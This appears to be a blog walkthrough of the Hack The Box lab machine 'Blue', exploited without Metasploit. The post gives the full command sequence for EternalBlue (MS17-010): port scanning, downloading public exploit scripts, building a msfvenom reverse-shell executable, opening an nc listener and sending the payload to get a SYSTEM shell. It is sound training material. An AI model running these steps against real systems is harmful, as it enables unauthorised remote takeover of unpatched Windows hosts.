@@ -1,0 +1,477 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Blue (Without Metasploit)" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Just bloggin cyber security related content." /><meta property="og:description" content="Just bloggin cyber security related content." /><link rel="canonical" href="https://rizemon.github.io/posts/blue-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/blue-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-12T15:49:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Blue (Without Metasploit)" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/blue-htb/"},"description":"Just bloggin cyber security related content.","url":"https://rizemon.github.io/posts/blue-htb/","@type":"BlogPosting","headline":"Hack The Box - Blue (Without Metasploit)","dateModified":"2021-01-12T18:34:40+08:00","datePublished":"2021-01-12T15:49:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Blue (Without Metasploit) | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Blue (Without Metasploit)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Blue (Without Metasploit)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Jan 12, 2021, 3:49 PM +0800" > Jan 12, 2021 <i class="unloaded">2021-01-12T15:49:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Jan 12, 2021, 6:34 PM +0800" > Jan 12, 2021 <i class="unloaded">2021-01-12T18:34:40+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1686 words">9 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/blue.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.40 blue.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>To speed up my recon, I’ve moved to <a href="https://github.com/RustScan/RustScan"><code class="language-plaintext highlighter-rouge">rustscan</code></a>. I’ve also created 2 “aliases” called <code class="language-plaintext highlighter-rouge">superscan</code> and <code class="language-plaintext highlighter-rouge">resolve</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>which resolve 
+resolve <span class="o">()</span> <span class="o">{</span>
+        <span class="nb">cat</span> /etc/hosts | <span class="nb">grep</span> <span class="nt">--color</span><span class="o">=</span>auto <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 1
+<span class="o">}</span>
+
+<span class="nv">$ </span>which superscan
+superscan <span class="o">()</span> <span class="o">{</span>
+        <span class="nv">name</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>resolve <span class="nv">$1</span><span class="si">)</span><span class="s2">"</span> 
+        rustscan <span class="nt">--accessible</span> <span class="nt">-a</span> <span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span> <span class="nt">-r</span> 1-65535 <span class="nt">--</span> <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span>
+<span class="o">}</span>
+
+<span class="nv">$ </span>superscan blue.htb
+File limit higher than batch size. Can increase speed by increasing batch size <span class="s1">'-b 1048476'</span><span class="nb">.</span>
+Open 10.10.10.40:135
+Open 10.10.10.40:139
+Open 10.10.10.40:445
+Open 10.10.10.40:49152
+Open 10.10.10.40:49153
+Open 10.10.10.40:49154
+Open 10.10.10.40:49155
+Open 10.10.10.40:49156
+Open 10.10.10.40:49157
+Starting Script<span class="o">(</span>s<span class="o">)</span>
+Script to be run Some<span class="o">(</span><span class="s2">"nmap -vvv -p  "</span><span class="o">)</span>
+
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-12 07:09 UTC
+NSE: Loaded 151 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 07:09
+Completed NSE at 07:09, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 07:09
+Completed NSE at 07:09, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 07:09
+Completed NSE at 07:09, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 07:09
+Completed Parallel DNS resolution of 1 host. at 07:09, 0.00s elapsed
+DNS resolution of 1 IPs took 0.00s. Mode: Async <span class="o">[</span><span class="c">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
+Initiating Connect Scan at 07:09
+Scanning 10.10.10.40 <span class="o">[</span>9 ports]
+Discovered open port 135/tcp on 10.10.10.40
+Discovered open port 139/tcp on 10.10.10.40
+Discovered open port 445/tcp on 10.10.10.40
+Discovered open port 49157/tcp on 10.10.10.40
+Discovered open port 49152/tcp on 10.10.10.40
+Discovered open port 49153/tcp on 10.10.10.40
+Discovered open port 49155/tcp on 10.10.10.40
+Discovered open port 49156/tcp on 10.10.10.40
+Discovered open port 49154/tcp on 10.10.10.40
+Completed Connect Scan at 07:09, 0.01s elapsed <span class="o">(</span>9 total ports<span class="o">)</span>
+Initiating Service scan at 07:09
+Scanning 9 services on 10.10.10.40
+Service scan Timing: About 44.44% <span class="k">done</span><span class="p">;</span> ETC: 07:11 <span class="o">(</span>0:01:08 remaining<span class="o">)</span>
+Completed Service scan at 07:10, 58.73s elapsed <span class="o">(</span>9 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.10.10.40.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 07:10
+Completed NSE at 07:10, 8.98s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 07:10
+Completed NSE at 07:10, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 07:10
+Completed NSE at 07:10, 0.00s elapsed
+Nmap scan report <span class="k">for </span>10.10.10.40
+Host is up, received user-set <span class="o">(</span>0.0062s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-01-12 07:09:20 UTC <span class="k">for </span>68s
+
+PORT      STATE SERVICE      REASON  VERSION
+135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49156/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49157/tcp open  msrpc        syn-ack Microsoft Windows RPC
+Service Info: Host: HARIS-PC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2s, deviation: 2s, median: 0s
+| p2p-conficker: 
+|   Checking <span class="k">for </span>Conficker.C or higher...
+|   Check 1 <span class="o">(</span>port 53207/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Couldn<span class="s1">'t connect)
+|   Check 2 (port 12383/tcp): CLEAN (Couldn'</span>t connect<span class="o">)</span>
+|   Check 3 <span class="o">(</span>port 19006/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 4 <span class="o">(</span>port 54754/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 <span class="o">(</span>Windows 7 Professional 6.1<span class="o">)</span>
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC<span class="se">\x</span>00
+|   Workgroup: WORKGROUP<span class="se">\x</span>00
+|_  System <span class="nb">time</span>: 2021-01-12T07:10:24+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-01-12T07:10:22
+|_  start_date: 2021-01-12T07:07:47
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 07:10
+Completed NSE at 07:10, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 07:10
+Completed NSE at 07:10, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 07:10
+Completed NSE at 07:10, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>68.19 seconds
+</pre></table></code></div></div><h1 id="enumeration">Enumeration</h1><h2 id="port-445-windows-7-professional-7601-service-pack-1-microsoft-ds-workgroup-workgroup">Port 445 <code class="language-plaintext highlighter-rouge">Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</code></h2><p>If we use the <code class="language-plaintext highlighter-rouge">smb-vuln-*</code> scripts of <code class="language-plaintext highlighter-rouge">nmap</code>, we see that it is vulnerable to <code class="language-plaintext highlighter-rouge">EternalBlue</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-Pn</span> <span class="nt">-p</span> 445 <span class="nt">--script</span> smb-vuln-<span class="k">*</span> blue.htb                                 
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-10 09:21 EST
+Nmap scan report <span class="k">for </span>blue.htb <span class="o">(</span>10.10.10.40<span class="o">)</span>
+Host is up <span class="o">(</span>0.0097s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: <span class="nb">false</span>
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability <span class="k">in </span>Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk <span class="nb">factor</span>: HIGH
+|       A critical remote code execution vulnerability exists <span class="k">in </span>Microsoft SMBv1
+|        servers <span class="o">(</span>ms17-010<span class="o">)</span><span class="nb">.</span>
+|           
+|     Disclosure <span class="nb">date</span>: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.13 seconds
+</pre></table></code></div></div><h1 id="exploitation">Exploitation</h1><p><code class="language-plaintext highlighter-rouge">Metasploit</code> has modules that exploit this vulnerability but I will be using some scripts that I found on Github that are able to do the same job.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir </span>eternalblue
+<span class="nv">$ </span>curl https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py <span class="o">&gt;</span> eternalblue/send_and_execute.py
+<span class="nv">$ </span>curl https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py <span class="o">&gt;</span> eternalblue/mysmb.py
+<span class="nv">$ </span>curl https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py <span class="o">&gt;</span> eternalblue/checker.py
+</pre></table></code></div></div><p>Exploiting <code class="language-plaintext highlighter-rouge">EternalBlue</code> requires us to find an accessible named pipe, so lets run <code class="language-plaintext highlighter-rouge">checker.py</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python eternablue/checker.py blue.htb
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+<span class="o">===</span> Testing named pipes <span class="o">===</span>
+spoolss: STATUS_ACCESS_DENIED
+samr: STATUS_ACCESS_DENIED
+netlogon: STATUS_ACCESS_DENIED
+lsarpc: STATUS_ACCESS_DENIED
+browser: STATUS_ACCESS_DENIED
+</pre></table></code></div></div><p>We are getting <code class="language-plaintext highlighter-rouge">STATUS_ACCESS_DENIED</code>. Let’s try setting our username to <code class="language-plaintext highlighter-rouge">guest</code> in the script and see if it changes anything.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>eternalblue/checker.py
+...
+USERNAME <span class="o">=</span> <span class="s1">'guest'</span>
+...
+
+<span class="nv">$ </span>python eternalblue/checker.py blue.htb
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+<span class="o">===</span> Testing named pipes <span class="o">===</span>
+spoolss: STATUS_OBJECT_NAME_NOT_FOUND
+samr: Ok <span class="o">(</span>64 bit<span class="o">)</span>
+netlogon: Ok <span class="o">(</span>Bind context 1 rejected: provider_rejection<span class="p">;</span> abstract_syntax_not_supported <span class="o">(</span>this usually means the interface isn<span class="s1">'t listening on the given endpoint))
+lsarpc: Ok (64 bit)
+browser: Ok (64 bit)
+</span></pre></table></code></div></div><p>It seems there are 3 named pipes we can use and note that the machine is <code class="language-plaintext highlighter-rouge">64-bit</code>. Now we just need to prepare an executable that establishes a reverse shell connection back to us when executed. We can use msfvenom for this.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>tun0 <span class="nv">LPORT</span><span class="o">=</span>1337 <span class="nt">-f</span> exe <span class="o">&gt;</span> reverse.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+</pre></table></code></div></div><p>Now that is done, we setup our <code class="language-plaintext highlighter-rouge">nc</code> listener.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+</pre></table></code></div></div><p>Then finally we can exploit the vulnerability with <code class="language-plaintext highlighter-rouge">send_and_execute.py</code> and specifying our executable and the name of the named pipe we want to use. Remember to set the username to <code class="language-plaintext highlighter-rouge">guest</code> as well.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>eternalblue/send_and_execute.py
+...
+USERNAME <span class="o">=</span> <span class="s1">'guest'</span>
+...
+
+<span class="nv">$ </span>python eternalblue/send_and_execute.py blue.htb reverse.exe 445 samr                               
+Trying to connect to blue.htb:445
+Target OS: Windows 7 Professional 7601 Service Pack 1
+Target is 64 bit
+Got frag size: 0x10
+GROOM_POOL_SIZE: 0x5030
+BRIDE_TRANS_SIZE: 0xfa0
+CONNECTION: 0xfffffa8001d24920
+SESSION: 0xfffff8a0082119e0
+FLINK: 0xfffff8a001173048
+InParam: 0xfffff8a00282715c
+MID: 0x807
+unexpected alignment, diff: 0x-16b4fb8
+leak failed... try again
+CONNECTION: 0xfffffa8001d24920
+SESSION: 0xfffff8a0082119e0
+FLINK: 0xfffff8a002887088
+InParam: 0xfffff8a00288115c
+MID: 0x803
+success controlling groom transaction
+modify trans1 struct <span class="k">for </span>arbitrary <span class="nb">read</span>/write
+make this SMB session to be SYSTEM
+overwriting session security context
+Sending file YDERDS.exe...
+Opening SVCManager on blue.htb.....
+Creating service hRhL.....
+Starting service hRhL.....
+The NETBIOS connection with the remote host timed out.
+Removing service hRhL.....
+ServiceExec Error on: blue.htb
+nca_s_proto_error
+Done
+</pre></table></code></div></div><p>On our listener that we setup beforehand, we receive a connection.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>10.10.14.7] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.40] 49158
+Microsoft Windows <span class="o">[</span>Version 6.1.7601]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
